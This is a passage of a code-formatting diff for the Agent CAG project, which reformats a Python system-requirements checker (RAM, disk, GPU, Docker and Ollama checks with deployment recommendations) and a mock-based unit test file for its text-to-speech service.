\"monitoring\":\n                 continue  # Skip monitoring as it's an add-on\n-                \n+\n             analysis = {\n-                'suitable': True,\n-                'performance': 'good',\n-                'issues': [],\n-                'estimated_resources': {}\n+                \"suitable\": True,\n+                \"performance\": \"good\",\n+                \"issues\": [],\n+                \"estimated_resources\": {},\n             }\n-            \n+\n             # Calculate resource requirements\n-            if profile_name == 'local_ollama':\n+            if profile_name == \"local_ollama\":\n                 # Local Ollama mode modifies lightweight requirements\n-                base_profile = self.profiles['lightweight'].copy()\n-                base_profile['min_ram_gb'] -= profile['ram_savings_gb']\n-                base_profile['recommended_ram_gb'] -= profile['ram_savings_gb']\n-                base_profile['min_disk_gb'] -= profile['disk_savings_gb']\n-                base_profile['recommended_disk_gb'] -= profile['disk_savings_gb']\n+                base_profile = self.profiles[\"lightweight\"].copy()\n+                base_profile[\"min_ram_gb\"] -= profile[\"ram_savings_gb\"]\n+                base_profile[\"recommended_ram_gb\"] -= profile[\"ram_savings_gb\"]\n+                base_profile[\"min_disk_gb\"] -= profile[\"disk_savings_gb\"]\n+                base_profile[\"recommended_disk_gb\"] -= profile[\"disk_savings_gb\"]\n                 profile_reqs = base_profile\n-                \n+\n                 # Check if Ollama is available locally\n-                if not self.results['requirements']['ollama']['installed']:\n-                    analysis['issues'].append(\"Ollama not installed locally\")\n-                    analysis['suitable'] = False\n+                if not self.results[\"requirements\"][\"ollama\"][\"installed\"]:\n+                    analysis[\"issues\"].append(\"Ollama not installed locally\")\n+                    analysis[\"suitable\"] = False\n             else:\n                 profile_reqs = profile\n-            \n+\n             # Check RAM requirements\n-            if system_ram < profile_reqs['min_ram_gb']:\n-                analysis['suitable'] = False\n-                analysis['issues'].append(f\"Insufficient RAM: {system_ram}GB < {profile_reqs['min_ram_gb']}GB required\")\n-            elif system_ram < profile_reqs['recommended_ram_gb']:\n-                analysis['performance'] = 'limited'\n-                analysis['issues'].append(f\"RAM below recommended: {system_ram}GB < {profile_reqs['recommended_ram_gb']}GB\")\n-            \n+            if system_ram < profile_reqs[\"min_ram_gb\"]:\n+                analysis[\"suitable\"] = False\n+                analysis[\"issues\"].append(\n+                    f\"Insufficient RAM: {system_ram}GB < {profile_reqs['min_ram_gb']}GB required\"\n+                )\n+            elif system_ram < profile_reqs[\"recommended_ram_gb\"]:\n+                analysis[\"performance\"] = \"limited\"\n+                analysis[\"issues\"].append(\n+                    f\"RAM below recommended: {system_ram}GB < {profile_reqs['recommended_ram_gb']}GB\"\n+                )\n+\n             # Check disk space\n-            if system_disk < profile_reqs['min_disk_gb']:\n-                analysis['suitable'] = False\n-                analysis['issues'].append(f\"Insufficient disk space: {system_disk}GB < {profile_reqs['min_disk_gb']}GB required\")\n-            elif system_disk < profile_reqs['recommended_disk_gb']:\n-                analysis['performance'] = 'limited'\n-                analysis['issues'].append(f\"Disk space below recommended: {system_disk}GB < {profile_reqs['recommended_disk_gb']}GB\")\n-            \n+            if system_disk < profile_reqs[\"min_disk_gb\"]:\n+                analysis[\"suitable\"] = False\n+                analysis[\"issues\"].append(\n+                    f\"Insufficient disk space: {system_disk}GB < {profile_reqs['min_disk_gb']}GB required\"\n+                )\n+            elif system_disk < profile_reqs[\"recommended_disk_gb\"]:\n+                analysis[\"performance\"] = \"limited\"\n+                analysis[\"issues\"].append(\n+                    f\"Disk space below recommended: {system_disk}GB < {profile_reqs['recommended_disk_gb']}GB\"\n+                )\n+\n             # Check CPU cores\n-            if system_cpu < profile_reqs['min_cpu_cores']:\n-                analysis['suitable'] = False\n-                analysis['issues'].append(f\"Insufficient CPU cores: {system_cpu} < {profile_reqs['min_cpu_cores']} required\")\n-            \n+            if system_cpu < profile_reqs[\"min_cpu_cores\"]:\n+                analysis[\"suitable\"] = False\n+                analysis[\"issues\"].append(\n+                    f\"Insufficient CPU cores: {system_cpu} < {profile_reqs['min_cpu_cores']} required\"\n+                )\n+\n             # Check GPU requirements\n-            has_gpu = self.results['requirements']['gpu']['nvidia_gpu']\n-            if profile_reqs.get('gpu_required') and not has_gpu:\n-                analysis['suitable'] = False\n-                analysis['issues'].append(\"GPU required but not available\")\n-            elif profile_reqs.get('gpu_recommended') and not has_gpu:\n-                analysis['performance'] = 'limited'\n-                analysis['issues'].append(\"GPU recommended for optimal performance\")\n-            \n+            has_gpu = self.results[\"requirements\"][\"gpu\"][\"nvidia_gpu\"]\n+            if profile_reqs.get(\"gpu_required\") and not has_gpu:\n+                analysis[\"suitable\"] = False\n+                analysis[\"issues\"].append(\"GPU required but not available\")\n+            elif profile_reqs.get(\"gpu_recommended\") and not has_gpu:\n+                analysis[\"performance\"] = \"limited\"\n+                analysis[\"issues\"].append(\"GPU recommended for optimal performance\")\n+\n             # Estimate resource usage\n-            analysis['estimated_resources'] = {\n-                'ram_usage_gb': profile_reqs['min_ram_gb'],\n-                'disk_usage_gb': profile_reqs['min_disk_gb'],\n-                'cpu_cores_used': min(profile_reqs['min_cpu_cores'], system_cpu)\n+            analysis[\"estimated_resources\"] = {\n+                \"ram_usage_gb\": profile_reqs[\"min_ram_gb\"],\n+                \"disk_usage_gb\": profile_reqs[\"min_disk_gb\"],\n+                \"cpu_cores_used\": min(profile_reqs[\"min_cpu_cores\"], system_cpu),\n             }\n-            \n-            self.results['deployment_profiles'][profile_name] = analysis\n+\n+            self.results[\"deployment_profiles\"][profile_name] = analysis\n \n     def generate_recommendations(self):\n         \"\"\"Generate deployment recommendations based on system analysis.\"\"\"\n         recommendations = []\n         warnings = []\n-        \n+\n         # Docker recommendations\n-        docker = self.results['requirements']['docker']\n-        if not docker['installed']:\n-            recommendations.append(\"Install Docker: https://docs.docker.com/get-docker/\")\n-        elif not docker['daemon_running']:\n+        docker = self.results[\"requirements\"][\"docker\"]\n+        if not docker[\"installed\"]:\n+            recommendations.append(\n+                \"Install Docker: https://docs.docker.com/get-docker/\"\n+            )\n+        elif not docker[\"daemon_running\"]:\n             recommendations.append(\"Start Docker daemon: sudo systemctl start docker\")\n-        \n-        if not docker['compose_installed']:\n-            recommendations.append(\"Install Docker Compose: https://docs.docker.com/compose/install/\")\n-        \n-        if not docker['user_in_group']:\n-            recommendations.append(\"Add user to docker group: sudo usermod -aG docker $USER\")\n-            recommendations.append(\"Log out and back in for group changes to take effect\")\n-        \n+\n+        if not docker[\"compose_installed\"]:\n+            recommendations.append(\n+                \"Install Docker Compose: https://docs.docker.com/compose/install/\"\n+            )\n+\n+        if not docker[\"user_in_group\"]:\n+            recommendations.append(\n+                \"Add user to docker group: sudo usermod -aG docker $USER\"\n+            )\n+            recommendations.append(\n+                \"Log out and back in for group changes to take effect\"\n+            )\n+\n         # GPU recommendations\n-        gpu = self.results['requirements']['gpu']\n-        if not gpu['nvidia_gpu']:\n-            warnings.append(\"No NVIDIA GPU detected. LLM inference will be slower on CPU.\")\n-            recommendations.append(\"Consider using local Ollama mode for better CPU performance\")\n-        elif not docker['gpu_support']:\n-            recommendations.append(\"Install NVIDIA Container Toolkit for GPU support in Docker\")\n-            recommendations.append(\"https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html\")\n-        \n+        gpu = self.results[\"requirements\"][\"gpu\"]\n+        if not gpu[\"nvidia_gpu\"]:\n+            warnings.append(\n+                \"No NVIDIA GPU detected. LLM inference will be slower on CPU.\"\n+            )\n+            recommendations.append(\n+                \"Consider using local Ollama mode for better CPU performance\"\n+            )\n+        elif not docker[\"gpu_support\"]:\n+            recommendations.append(\n+                \"Install NVIDIA Container Toolkit for GPU support in Docker\"\n+            )\n+            recommendations.append(\n+                \"https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html\"\n+            )\n+\n         # Profile recommendations\n-        suitable_profiles = [name for name, analysis in self.results['deployment_profiles'].items() \n-                           if analysis['suitable']]\n-        \n+        suitable_profiles = [\n+            name\n+            for name, analysis in self.results[\"deployment_profiles\"].items()\n+            if analysis[\"suitable\"]\n+        ]\n+\n         if not suitable_profiles:\n-            recommendations.append(\"System does not meet minimum requirements for any profile\")\n-            recommendations.append(\"Consider upgrading hardware or using a cloud deployment\")\n+            recommendations.append(\n+                \"System does not meet minimum requirements for any profile\"\n+            )\n+            recommendations.append(\n+                \"Consider upgrading hardware or using a cloud deployment\"\n+            )\n         else:\n             best_profile = self.get_best_profile(suitable_profiles)\n-            recommendations.append(f\"Recommended deployment: make up-{best_profile.replace('_', '-')}\")\n-        \n+            recommendations.append(\n+                f\"Recommended deployment: make up-{best_profile.replace('_', '-')}\"\n+            )\n+\n         # Resource optimization\n-        system_ram = self.results['system_info']['memory_total_gb']\n+        system_ram = self.results[\"system_info\"][\"memory_total_gb\"]\n         if system_ram < 16:\n-            recommendations.append(\"Consider closing other applications to free up memory\")\n+            recommendations.append(\n+                \"Consider closing other applications to free up memory\"\n+            )\n             recommendations.append(\"Use lightweight profile to minimize resource usage\")\n-        \n-        self.results['recommendations'] = recommendations\n-        self.results['warnings'].extend(warnings)\n+\n+        self.results[\"recommendations\"] = recommendations\n+        self.results[\"warnings\"].extend(warnings)\n \n     def get_best_profile(self, suitable_profiles: List[str]) -> str:\n         \"\"\"Determine the best profile for the system.\"\"\"\n         # Priority order: full > lightweight > local_ollama\n-        if 'full' in suitable_profiles:\n-            full_analysis = self.results['deployment_profiles']['full']\n-            if full_analysis['performance'] == 'good':\n-                return 'full'\n-        \n-        if 'lightweight' in suitable_profiles:\n-            lightweight_analysis = self.results['deployment_profiles']['lightweight']\n-            if lightweight_analysis['performance'] == 'good':\n-                return 'lightweight'\n-        \n-        if 'local_ollama' in suitable_profiles:\n-            return 'local'\n-        \n+        if \"full\" in suitable_profiles:\n+            full_analysis = self.results[\"deployment_profiles\"][\"full\"]\n+            if full_analysis[\"performance\"] == \"good\":\n+                return \"full\"\n+\n+        if \"lightweight\" in suitable_profiles:\n+            lightweight_analysis = self.results[\"deployment_profiles\"][\"lightweight\"]\n+            if lightweight_analysis[\"performance\"] == \"good\":\n+                return \"lightweight\"\n+\n+        if \"local_ollama\" in suitable_profiles:\n+            return \"local\"\n+\n         # Return the first suitable profile as fallback\n-        return suitable_profiles[0] if suitable_profiles else 'lightweight'\n+        return suitable_profiles[0] if suitable_profiles else \"lightweight\"\n \n     def run_all_checks(self):\n         \"\"\"Run all system checks.\"\"\"\n         print(\"\ud83d\udd0d Analyzing system requirements for Agent CAG...\")\n-        \n+\n         self.check_system_info()\n         print(\"\u2713 System information gathered\")\n-        \n+\n         self.check_docker()\n         print(\"\u2713 Docker configuration checked\")\n-        \n+\n         self.check_ollama()\n         print(\"\u2713 Ollama availability checked\")\n-        \n+\n         self.check_gpu()\n         print(\"\u2713 GPU capabilities analyzed\")\n-        \n+\n         self.analyze_profiles()\n         print(\"\u2713 Deployment profiles analyzed\")\n-        \n+\n         self.generate_recommendations()\n         print(\"\u2713 Recommendations generated\")\n \n     def print_report(self):\n         \"\"\"Print a comprehensive system report.\"\"\"\n-        print(\"\\n\" + \"=\"*80)\n+        print(\"\\n\" + \"=\" * 80)\n         print(\"\ud83d\ude80 AGENT CAG SYSTEM REQUIREMENTS REPORT\")\n-        print(\"=\"*80)\n-        \n+        print(\"=\" * 80)\n+\n         # System Information\n         print(\"\\n\ud83d\udcca SYSTEM INFORMATION\")\n         print(\"-\" * 40)\n-        info = self.results['system_info']\n+        info = self.results[\"system_info\"]\n         print(f\"Platform: {info.get('platform', 'Unknown')}\")\n-        print(f\"CPU: {info.get('processor', 'Unknown')} ({info.get('cpu_count', 0)} cores)\")\n-        print(f\"Memory: {info.get('memory_total_gb', 0):.1f}GB total, {info.get('memory_available_gb', 0):.1f}GB available\")\n-        print(f\"Disk: {info.get('disk_free_gb', 0):.1f}GB free of {info.get('disk_total_gb', 0):.1f}GB total\")\n-        \n+        print(\n+            f\"CPU: {info.get('processor', 'Unknown')} ({info.get('cpu_count', 0)} cores)\"\n+        )\n+        print(\n+            f\"Memory: {info.get('memory_total_gb', 0):.1f}GB total, {info.get('memory_available_gb', 0):.1f}GB available\"\n+        )\n+        print(\n+            f\"Disk: {info.get('disk_free_gb', 0):.1f}GB free of {info.get('disk_total_gb', 0):.1f}GB total\"\n+        )\n+\n         # Docker Status\n         print(\"\\n\ud83d\udc33 DOCKER STATUS\")\n         print(\"-\" * 40)\n-        docker = self.results['requirements']['docker']\n+        docker = self.results[\"requirements\"][\"docker\"]\n         print(f\"Docker Installed: {'\u2713' if docker['installed'] else '\u2717'}\")\n-        if docker['version']:\n+        if docker[\"version\"]:\n             print(f\"Docker Version: {docker['version']}\")\n         print(f\"Docker Daemon Running: {'\u2713' if docker['daemon_running'] else '\u2717'}\")\n         print(f\"Docker Compose: {'\u2713' if docker['compose_installed'] else '\u2717'}\")\n         print(f\"User in Docker Group: {'\u2713' if docker['user_in_group'] else '\u2717'}\")\n         print(f\"GPU Support: {'\u2713' if docker['gpu_support'] else '\u2717'}\")\n-        \n+\n         # GPU Status\n         print(\"\\n\ud83c\udfae GPU STATUS\")\n         print(\"-\" * 40)\n-        gpu = self.results['requirements']['gpu']\n-        if gpu['nvidia_gpu']:\n-            print(f\"NVIDIA GPU: \u2713 ({gpu['gpu_count']} GPU(s), {gpu['gpu_memory_gb']:.1f}GB total)\")\n-            if gpu['nvidia_driver']:\n+        gpu = self.results[\"requirements\"][\"gpu\"]\n+        if gpu[\"nvidia_gpu\"]:\n+            print(\n+                f\"NVIDIA GPU: \u2713 ({gpu['gpu_count']} GPU(s), {gpu['gpu_memory_gb']:.1f}GB total)\"\n+            )\n+            if gpu[\"nvidia_driver\"]:\n                 print(f\"Driver Version: {gpu['nvidia_driver']}\")\n         else:\n             print(\"NVIDIA GPU: \u2717 (CPU-only mode)\")\n-        \n+\n         # Ollama Status\n         print(\"\\n\ud83e\udd99 OLLAMA STATUS\")\n         print(\"-\" * 40)\n-        ollama = self.results['requirements']['ollama']\n+        ollama = self.results[\"requirements\"][\"ollama\"]\n         print(f\"Ollama Installed: {'\u2713' if ollama['installed'] else '\u2717'}\")\n-        if ollama['version']:\n+        if ollama[\"version\"]:\n             print(f\"Ollama Version: {ollama['version']}\")\n         print(f\"Ollama Running: {'\u2713' if ollama['running'] else '\u2717'}\")\n-        if ollama['models']:\n+        if ollama[\"models\"]:\n             print(f\"Available Models: {', '.join(ollama['models'])}\")\n-        \n+\n         # Deployment Profiles\n         print(\"\\n\ud83c\udfaf DEPLOYMENT PROFILE ANALYSIS\")\n         print(\"-\" * 40)\n-        for profile_name, analysis in self.results['deployment_profiles'].items():\n+        for profile_name, analysis in self.results[\"deployment_profiles\"].items():\n             profile = self.profiles[profile_name]\n-            status = \"\u2713\" if analysis['suitable'] else \"\u2717\"\n-            performance = analysis['performance'].upper()\n-            \n+            status = \"\u2713\" if analysis[\"suitable\"] else \"\u2717\"\n+            performance = analysis[\"performance\"].upper()\n+\n             print(f\"\\n{status} {profile['name']} ({performance})\")\n             print(f\"   {profile['description']}\")\n-            \n-            if analysis['estimated_resources']:\n-                resources = analysis['estimated_resources']\n-                print(f\"   Estimated Usage: {resources['ram_usage_gb']}GB RAM, {resources['disk_usage_gb']}GB disk\")\n-            \n-            if analysis['issues']:\n-                for issue in analysis['issues']:\n+\n+            if analysis[\"estimated_resources\"]:\n+                resources = analysis[\"estimated_resources\"]\n+                print(\n+                    f\"   Estimated Usage: {resources['ram_usage_gb']}GB RAM, {resources['disk_usage_gb']}GB disk\"\n+                )\n+\n+            if analysis[\"issues\"]:\n+                for issue in analysis[\"issues\"]:\n                     print(f\"   \u26a0\ufe0f  {issue}\")\n-        \n+\n         # Recommendations\n-        if self.results['recommendations']:\n+        if self.results[\"recommendations\"]:\n             print(\"\\n\ud83d\udca1 RECOMMENDATIONS\")\n             print(\"-\" * 40)\n-            for i, rec in enumerate(self.results['recommendations'], 1):\n+            for i, rec in enumerate(self.results[\"recommendations\"], 1):\n                 print(f\"{i}. {rec}\")\n-        \n+\n         # Warnings\n-        if self.results['warnings']:\n+        if self.results[\"warnings\"]:\n             print(\"\\n\u26a0\ufe0f  WARNINGS\")\n             print(\"-\" * 40)\n-            for warning in self.results['warnings']:\n+            for warning in self.results[\"warnings\"]:\n                 print(f\"\u2022 {warning}\")\n-        \n+\n         # Errors\n-        if self.results['errors']:\n+        if self.results[\"errors\"]:\n             print(\"\\n\u274c ERRORS\")\n             print(\"-\" * 40)\n-            for error in self.results['errors']:\n+            for error in self.results[\"errors\"]:\n                 print(f\"\u2022 {error}\")\n-        \n-        print(\"\\n\" + \"=\"*80)\n+\n+        print(\"\\n\" + \"=\" * 80)\n \n     def save_report(self, filename: str = \"system_check_report.json\"):\n         \"\"\"Save the detailed report to a JSON file.\"\"\"\n-        with open(filename, 'w') as f:\n+        with open(filename, \"w\") as f:\n             json.dump(self.results, f, indent=2)\n         print(f\"\ud83d\udcc4 Detailed report saved to {filename}\")\n \n \n def main():\n     \"\"\"Main function to run system checks.\"\"\"\n-    if len(sys.argv) > 1 and sys.argv[1] in ['-h', '--help']:\n+    if len(sys.argv) > 1 and sys.argv[1] in [\"-h\", \"--help\"]:\n         print(\"Agent CAG System Requirements Checker\")\n         print(\"Usage: python check_system.py [--save-report]\")\n         print(\"       python check_system.py --help\")\n         return\n-    \n+\n     checker = SystemChecker()\n-    \n+\n     try:\n         checker.run_all_checks()\n         checker.print_report()\n-        \n-        if '--save-report' in sys.argv:\n+\n+        if \"--save-report\" in sys.argv:\n             checker.save_report()\n-        \n+\n         # Exit with appropriate code\n-        suitable_profiles = [name for name, analysis in checker.results['deployment_profiles'].items() \n-                           if analysis['suitable']]\n-        \n+        suitable_profiles = [\n+            name\n+            for name, analysis in checker.results[\"deployment_profiles\"].items()\n+            if analysis[\"suitable\"]\n+        ]\n+\n         if not suitable_profiles:\n             print(\"\\n\u274c System does not meet minimum requirements\")\n             sys.exit(1)\n-        elif checker.results['errors']:\n+        elif checker.results[\"errors\"]:\n             print(\"\\n\u26a0\ufe0f  System check completed with errors\")\n             sys.exit(2)\n         else:\n             print(\"\\n\u2705 System check completed successfully\")\n             sys.exit(0)\n-            \n+\n     except KeyboardInterrupt:\n         print(\"\\n\\n\u23f9\ufe0f  System check interrupted by user\")\n         sys.exit(130)\n     except Exception as e:\n         print(f\"\\n\u274c System check failed: {e}\")\n         sys.exit(1)\n \n \n if __name__ == \"__main__\":\n-    main()\n\\ No newline at end of file\n+    main()\n--- /home/pas/source/agent-cag/tests/unit/test_tts.py\t2025-06-20 18:49:53.334744+00:00\n+++ /home/pas/source/agent-cag/tests/unit/test_tts.py\t2025-06-20 19:24:34.651853+00:00\n@@ -8,390 +8,384 @@\n from fastapi import FastAPI\n \n # Create a mock FastAPI app for testing\n app = FastAPI()\n \n+\n @app.post(\"/synthesize\")\n async def synthesize():\n     return {\"audio_data\": \"mock_audio_bytes\", \"format\": \"wav\", \"duration\": 2.5}\n \n+\n @app.get(\"/voices\")\n async def voices():\n     return {\"voices\": [\"en_US-lessac-medium\", \"en_US-ryan-medium\", \"en_GB-alan-medium\"]}\n \n+\n @app.get(\"/health\")\n async def health():\n     return {\"status\": \"healthy\", \"service\": \"agent-tts\"}\n \n+\n client = TestClient(app)\n \n \n class TestTTSService:\n     \"\"\"Test the TTS service functionality.\"\"\"\n-    \n+\n     def test_health_check(self):\n         \"\"\"Test TTS service health check.\"\"\"\n         response = client.get(\"/health\")\n-        \n+\n         assert response.status_code == 200\n         data = response.json()\n         assert data[\"status\"] == \"healthy\"\n         assert data[\"service\"] == \"agent-tts\"\n-    \n+\n     def test_synthesize_endpoint(self):\n         \"\"\"Test text synthesis endpoint.\"\"\"\n         response = client.post(\"/synthesize\")\n-        \n+\n         assert response.status_code == 200\n         data = response.json()\n         assert \"audio_data\" in data\n         assert \"format\" in data\n         assert \"duration\" in data\n         assert data[\"format\"] == \"wav\"\n-    \n+\n     def test_voices_endpoint(self):\n         \"\"\"Test available voices endpoint.\"\"\"\n         response = client.get(\"/voices\")\n-        \n+\n         assert response.status_code == 200\n         data = response.json()\n         assert \"voices\" in data\n         assert isinstance(data[\"voices\"], list)\n         assert len(data[\"voices\"]) > 0\n \n \n class TestPiperIntegration:\n     \"\"\"Test Piper TTS integration.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_piper_synthesis(self):\n         \"\"\"Test Piper synthesis functionality.\"\"\"\n         # Mock Piper synthesizer\n         mock_piper = AsyncMock()\n         mock_piper.synthesize.return_value = b\"mock_audio_data\"\n-        \n+\n         result = await mock_piper.synthesize(\n-            text=\"Hello, world!\",\n-            voice=\"en_US-lessac-medium\"\n+            text=\"Hello, world!\", voice=\"en_US-lessac-medium\"\n         )\n-        \n+\n         assert isinstance(result, bytes)\n         assert len(result) > 0\n-    \n+\n     def test_voice_loading(self):\n         \"\"\"Test voice model loading.\"\"\"\n         # Test voice configurations\n         voice_configs = {\n             \"en_US-lessac-medium\": {\n                 \"language\": \"en_US\",\n                 \"speaker\": \"lessac\",\n                 \"quality\": \"medium\",\n-                \"sample_rate\": 22050\n+                \"sample_rate\": 22050,\n             },\n             \"en_US-ryan-medium\": {\n                 \"language\": \"en_US\",\n                 \"speaker\": \"ryan\",\n                 \"quality\": \"medium\",\n-                \"sample_rate\": 22050\n-            }\n-        }\n-        \n+                \"sample_rate\": 22050,\n+            },\n+        }\n+\n         for voice_id, config in voice_configs.items():\n             assert isinstance(voice_id, str)\n             assert \"language\" in config\n             assert \"speaker\" in config\n             assert \"quality\" in config\n             assert config[\"sample_rate\"] > 0\n-    \n+\n     @pytest.mark.asyncio\n     async def test_audio_processing(self):\n         \"\"\"Test audio processing pipeline.\"\"\"\n         # Mock audio processor\n         mock_processor = AsyncMock()\n         mock_processor.process_audio.return_value = {\n             \"audio_data\": b\"processed_audio\",\n             \"sample_rate\": 22050,\n             \"channels\": 1,\n-            \"duration\": 3.2\n-        }\n-        \n+            \"duration\": 3.2,\n+        }\n+\n         result = await mock_processor.process_audio(b\"raw_audio\")\n-        \n+\n         assert \"audio_data\" in result\n         assert \"sample_rate\" in result\n         assert \"channels\" in result\n         assert \"duration\" in result\n         assert isinstance(result[\"audio_data\"], bytes)\n \n \n class TestTTSErrorHandling:\n     \"\"\"Test TTS error handling scenarios.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_voice_not_found(self):\n         \"\"\"Test handling of missing voices.\"\"\"\n         # Mock voice not found error\n         mock_synthesizer = AsyncMock()\n         mock_synthesizer.synthesize.side_effect = Exception(\"Voice not found\")\n-        \n+\n         with pytest.raises(Exception, match=\"Voice not found\"):\n-            await mock_synthesizer.synthesize(\n-                text=\"Test\",\n-                voice=\"nonexistent_voice\"\n-            )\n-    \n+            await mock_synthesizer.synthesize(text=\"Test\", voice=\"nonexistent_voice\")\n+\n     @pytest.mark.asyncio\n     async def test_synthesis_failure(self):\n         \"\"\"Test synthesis failure handling.\"\"\"\n         # Mock synthesis error\n         mock_synthesizer = AsyncMock()\n         mock_synthesizer.synthesize.side_effect = RuntimeError(\"Synthesis failed\")\n-        \n+\n         with pytest.raises(RuntimeError, match=\"Synthesis failed\"):\n             await mock_synthesizer.synthesize(\n-                text=\"Test text\",\n-                voice=\"en_US-lessac-medium\"\n+                text=\"Test text\", voice=\"en_US-lessac-medium\"\n             )\n-    \n+\n     def test_text_validation(self):\n         \"\"\"Test text input validation.\"\"\"\n         # Test text limits\n         max_text_length = 5000\n-        \n+\n         valid_text = \"A\" * 100\n         invalid_text = \"A\" * (max_text_length + 1)\n-        \n+\n         assert len(valid_text) <= max_text_length\n         assert len(invalid_text) > max_text_length\n-    \n+\n     def test_empty_text_handling(self):\n         \"\"\"Test empty text handling.\"\"\"\n         empty_texts = [\"\", \"   \", \"\\n\\t\", None]\n-        \n+\n         for text in empty_texts:\n             if text is None or not text.strip():\n                 # Should handle empty/whitespace text appropriately\n                 assert text is None or len(text.strip()) == 0\n \n \n class TestTTSPerformance:\n     \"\"\"Test TTS performance considerations.\"\"\"\n-    \n+\n     def test_synthesis_speed(self):\n         \"\"\"Test synthesis speed metrics.\"\"\"\n         # Test performance metrics\n         performance_metrics = {\n             \"real_time_factor\": 0.3,  # Should be < 1.0 for real-time\n-            \"synthesis_time\": 0.5,    # seconds\n-            \"audio_duration\": 2.0,    # seconds\n-            \"throughput\": 4.0         # audio_duration / synthesis_time\n-        }\n-        \n+            \"synthesis_time\": 0.5,  # seconds\n+            \"audio_duration\": 2.0,  # seconds\n+            \"throughput\": 4.0,  # audio_duration / synthesis_time\n+        }\n+\n         assert performance_metrics[\"real_time_factor\"] < 1.0\n         assert performance_metrics[\"synthesis_time\"] > 0\n         assert performance_metrics[\"audio_duration\"] > 0\n         assert performance_metrics[\"throughput\"] > 1.0\n-    \n+\n     @pytest.mark.asyncio\n     async def test_batch_synthesis(self):\n         \"\"\"Test batch synthesis capabilities.\"\"\"\n         # Mock batch synthesizer\n         mock_batch = AsyncMock()\n         mock_batch.synthesize_batch.return_value = [\n             {\"text\": \"Hello\", \"audio\": b\"audio1\", \"duration\": 1.0},\n-            {\"text\": \"World\", \"audio\": b\"audio2\", \"duration\": 1.2}\n+            {\"text\": \"World\", \"audio\": b\"audio2\", \"duration\": 1.2},\n         ]\n-        \n-        results = await mock_batch.synthesize_batch([\n-            {\"text\": \"Hello\", \"voice\": \"en_US-lessac-medium\"},\n-            {\"text\": \"World\", \"voice\": \"en_US-lessac-medium\"}\n-        ])\n-        \n+\n+        results = await mock_batch.synthesize_batch(\n+            [\n+                {\"text\": \"Hello\", \"voice\": \"en_US-lessac-medium\"},\n+                {\"text\": \"World\", \"voice\": \"en_US-lessac-medium\"},\n+            ]\n+        )\n+\n         assert len(results) == 2\n         assert all(\"audio\" in result for result in results)\n-    \n+\n     def test_memory_usage(self):\n         \"\"\"Test memory usage patterns.\"\"\"\n         # Test memory settings\n         memory_settings = {\n             \"max_concurrent_synthesis\": 3,\n             \"audio_buffer_size\": 1024 * 1024,  # 1MB\n-            \"voice_cache_size\": 5\n-        }\n-        \n+            \"voice_cache_size\": 5,\n+        }\n+\n         assert memory_settings[\"max_concurrent_synthesis\"] > 0\n         assert memory_settings[\"audio_buffer_size\"] > 0\n         assert memory_settings[\"voice_cache_size\"] > 0\n \n \n class TestTTSConfiguration:\n     \"\"\"Test TTS configuration management.\"\"\"\n-    \n+\n     def test_audio_settings(self):\n         \"\"\"Test audio configuration options.\"\"\"\n         # Test audio config\n         audio_config = {\n             \"sample_rate\": 22050,\n             \"bit_depth\": 16,\n             \"channels\": 1,\n             \"format\": \"wav\",\n-            \"quality\": \"medium\"\n-        }\n-        \n+            \"quality\": \"medium\",\n+        }\n+\n         valid_sample_rates = [16000, 22050, 44100, 48000]\n         valid_bit_depths = [8, 16, 24, 32]\n         valid_channels = [1, 2]\n         valid_formats = [\"wav\", \"mp3\", \"ogg\", \"flac\"]\n-        \n+\n         assert audio_config[\"sample_rate\"] in valid_sample_rates\n         assert audio_config[\"bit_depth\"] in valid_bit_depths\n         assert audio_config[\"channels\"] in valid_channels\n         assert audio_config[\"format\"] in valid_formats\n-    \n+\n     def test_voice_settings(self):\n         \"\"\"Test voice configuration options.\"\"\"\n         # Test voice settings\n-        voice_settings = {\n-            \"speed\": 1.0,\n-            \"pitch\": 0.0,\n-            \"volume\": 1.0,\n-            \"emphasis\": 0.5\n-        }\n-        \n+        voice_settings = {\"speed\": 1.0, \"pitch\": 0.0, \"volume\": 1.0, \"emphasis\": 0.5}\n+\n         assert 0.1 <= voice_settings[\"speed\"] <= 3.0\n         assert -2.0 <= voice_settings[\"pitch\"] <= 2.0\n         assert 0.0 <= voice_settings[\"volume\"] <= 2.0\n         assert 0.0 <= voice_settings[\"emphasis\"] <= 1.0\n-    \n+\n     def test_synthesis_options(self):\n         \"\"\"Test synthesis configuration options.\"\"\"\n         # Test synthesis options\n         synthesis_options = {\n             \"noise_scale\": 0.667,\n             \"noise_scale_w\": 0.8,\n             \"length_scale\": 1.0,\n-            \"sentence_silence\": 0.2\n-        }\n-        \n+            \"sentence_silence\": 0.2,\n+        }\n+\n         assert 0.0 <= synthesis_options[\"noise_scale\"] <= 1.0\n         assert 0.0 <= synthesis_options[\"noise_scale_w\"] <= 1.0\n         assert 0.1 <= synthesis_options[\"length_scale\"] <= 3.0\n         assert 0.0 <= synthesis_options[\"sentence_silence\"] <= 2.0\n \n \n class TestTTSIntegration:\n     \"\"\"Test TTS integration scenarios.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_ssml_support(self):\n         \"\"\"Test SSML (Speech Synthesis Markup Language) support.\"\"\"\n         # Mock SSML processor\n         mock_ssml = MagicMock()\n         mock_ssml.parse_ssml.return_value = {\n             \"text\": \"Hello world\",\n             \"prosody\": {\"rate\": \"medium\", \"pitch\": \"medium\"},\n-            \"breaks\": [{\"time\": \"500ms\", \"position\": 5}]\n-        }\n-        \n-        result = mock_ssml.parse_ssml('<speak>Hello <break time=\"500ms\"/> world</speak>')\n-        \n+            \"breaks\": [{\"time\": \"500ms\", \"position\": 5}],\n+        }\n+\n+        result = mock_ssml.parse_ssml(\n+            '<speak>Hello <break time=\"500ms\"/> world</speak>'\n+        )\n+\n         assert \"text\" in result\n         assert \"prosody\" in result\n         assert \"breaks\" in result\n-    \n+\n     def test_phoneme_support(self):\n         \"\"\"Test phoneme-based synthesis.\"\"\"\n         # Test phoneme mappings\n-        phoneme_examples = {\n-            \"hello\": \"h\u0259\u02c8lo\u028a\",\n-            \"world\": \"w\u025crld\",\n-            \"speech\": \"spi\u02d0t\u0283\"\n-        }\n-        \n+        phoneme_examples = {\"hello\": \"h\u0259\u02c8lo\u028a\", \"world\": \"w\u025crld\", \"speech\": \"spi\u02d0t\u0283\"}\n+\n         for word, phoneme in phoneme_examples.items():\n             assert isinstance(word, str)\n             assert isinstance(phoneme, str)\n             assert len(phoneme) > 